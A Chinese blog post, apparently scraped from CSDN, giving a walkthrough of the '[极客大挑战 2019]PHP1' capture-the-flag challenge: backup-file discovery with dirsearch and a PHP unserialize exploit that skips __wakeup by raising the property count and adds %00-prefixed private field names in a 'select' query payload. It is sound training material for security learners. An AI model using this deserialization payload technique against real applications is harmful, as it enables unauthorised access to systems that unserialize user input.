{"blogid": "124483542", "writerAge": "码龄1年", "writerBlogNum": "3", "writerCollect": "7", "writerComment": "0", "writerFan": "2", "writerGrade": "1级", "writerIntegral": "35", "writerName": "dabing_os", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_124483542.jpg", "writerRankTotal": "187316", "writerRankWeekly": "1102725", "writerThumb": "3", "writerVisitNum": "2663", "blog_read_count": "1407", "blog_time": "于 2022-04-30 15:51:11 发布", "blog_title": "[极客大挑战 2019]PHP1", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p>知识点：1.网站的备份文件</p>\n<p>               2.php反序列化</p>\n<p>用dirsearch扫一下：</p>\n<p><img alt=\"\" height=\"249\" src=\"..\\..\\static\\image\\595e0c9c80ef46f49562d420e35ec49a.png\" width=\"976\"/></p>\n<p>发现一个压缩包，下载下来</p>\n<p><img alt=\"\" height=\"91\" src=\"..\\..\\static\\image\\e4b97a6af3bc49f3a683d75abfa76867.png\" width=\"766\"/></p>\n<p><img alt=\"\" height=\"198\" src=\"..\\..\\static\\image\\1e0849db92f44898b09cdf7cfeb90189.png\" width=\"887\"/></p>\n<p>发现三个php文件，其中index.php为主页源代码。</p>\n<p>打开flag.php并未发现flag：</p>\n<p><img alt=\"\" height=\"119\" src=\"..\\..\\static\\image\\354cc9ffadac45c29867819408ce661d.png\" width=\"514\"/></p>\n<p>接着打开class.php：</p>\n<p><img alt=\"\" height=\"1084\" src=\"..\\..\\static\\image\\740615fa33734ee7adc092eacea5d89d.png\" width=\"1137\"/></p>\n<p>里面涉及php魔法方法</p>\n<p>__construct 是构造函数，在对象被创建的时候自动调用，进行类的初始化;</p>\n<p>__wakeup 当使用unserialize时被调用，可用于做些对象的初始化操作</p>\n<p>__destruct 是析构函数，作用与 __construct 正好相反，析构函数只有在对象被垃圾收集器收集前(即对象从内存中删除之前)才会被⾃动调⽤。析构函数允许我们在销毁⼀个对象之前执⾏⼀些特定的操作，例如关闭⽂件、释放结果集等。</p>\n<p>根据class.php代码，我们发现要想获取flag，只需username=admin password=100然后我们再执行__destruct()时可以获得flag</p>\n<p>于是构造反序列化：</p>\n<pre><code class=\"language-php\">&lt;?php\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    }\n}\n$a = new Name('admin',100);\n\nvar_dump(serialize($a))\n\n?&gt;</code></pre>\n<p>然后保存，运行，获得序列化的字符串</p>\n<pre><code class=\"language-php\">O:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}</code></pre>\n<p>在index.php中发现参数为select</p>\n<p><img alt=\"\" height=\"718\" src=\"..\\..\\static\\image\\0d50ef365ce047a98b1e8a2dfaeb9310.png\" width=\"1195\"/></p>\n<p> 于是我们将参数值给select，但是在反序列化的时候会首先执行__wakeup()魔法方法，这个方法会把我们的username重新赋值，所以我们考虑如何跳过__wakeup()，而去执行__destruct</p>\n<p><strong>在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup()</strong>，即把Name后面的数字2该为大于2的数字，于是我们这样构造payload：</p>\n<pre><code class=\"language-php\">?select=O:4:\"Name\":3:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}</code></pre>\n<p>接着我们发现，username和password为private声明的变量。<strong>因为username和password是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以要加上%00因此私有字段的字段名在序列化的时候，类名和字段名前面都会加上\\0的前缀。字符串长度也包括所加前缀的长度</strong></p>\n<p><img alt=\"\" height=\"62\" src=\"..\\..\\static\\image\\c589cffc93f7493489a962cc8c5a3ffe.png\" width=\"1200\"/></p>\n<p> （如上图，&lt;0x00&gt;复制时会丢失）</p>\n<p>于是我们再构造payload：</p>\n<pre><code class=\"language-php\">?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}</code></pre>\n<p>获得flag</p>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-04-30 15:51:11", "summary": "知识点：网站的备份文件反序列化用扫一下：发现一个压缩包，下载下来发现三个文件，其中为主页源代码。打开并未发现：接着打开：里面涉及魔法方法是构造函数，在对象被创建的时候自动调用，进行类的初始化当使用时被"}